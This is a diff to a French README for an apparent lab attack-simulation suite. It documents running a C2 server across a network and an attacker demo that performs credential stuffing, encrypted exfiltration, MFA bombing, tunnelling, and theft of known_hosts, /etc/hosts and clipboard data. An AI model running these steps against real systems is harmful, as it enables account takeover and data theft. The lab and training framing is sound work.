@@ -906,9 +906,29 @@ Une seule commande, exit code honnête : pré-checks d'environnement en ouvertur
 (python, dépendances, répertoires), puis 6 étapes 100% réelles avec verdict par
 ligne — C2 réel, stuffing (4 POST, verdicts HTTP individuels), exfil chiffré
 avec SHA-256 croisé émetteur/récepteur, MFA bombing avec stop-on-accept,
-tunnel WS, post-ex locale (known_hosts + presse-papier réellement volé).
+tunnel WS, post-ex locale (known_hosts + /etc/hosts + presse-papier si dispo).
 Stabilité vérifiée : 3 exécutions consécutives → 6/6 à chaque fois.
-Preuves : `captures/demo_live/` + `captures/lab_c2/`.
+Preuves : `captures/demo_live/` + compteurs C2 consultés PAR HTTP.
+
+**PORTABLE / RÉSEAU** — la démo ne dépend d'aucun appareil et fonctionne
+à travers le wifi/LAN : les preuves « côté serveur » sont obtenues par HTTP
+(compteurs + sessions du C2), donc valides même quand le C2 tourne sur une
+AUTRE machine. Scénario deux machines (validé en live via une IP wifi réelle) :
+
+```bash
+# Machine A — le C2, visible sur le réseau :
+LABC2_BIND=0.0.0.0 LABC2_ACCEPT_USERS="alice@corp.local,bob@corp.local" \
+LABC2_LOCK_USERS="locked@corp.local" LABC2_ACCEPT_AFTER_N=3 \
+.venv/bin/python c2/lab_c2_server.py 8099
+
+# Machine B — l'attaquante, n'importe où sur le réseau autorisé :
+make demo-real ARGS="--c2 http://IP-DE-LA-MACHINE-A:8099"
+```
+
+La machine B n'a besoin que du repo + `.venv` (httpx, websockets,
+cryptography) : rien d'autre n'est requis, aucun chemin de la machine A.
+Si le C2 est injoignable, la démo échoue en < 10s avec le diagnostic
+(pare-feu, `LABC2_BIND=0.0.0.0` oublié) au lieu de rester suspendue.
 
 Elle démarre elle-même ses serveurs réels (C2 de labo, reverse proxy AiTM,
 echo WebSocket) et valide 6 chemins 100% réels. Résultat attendu :
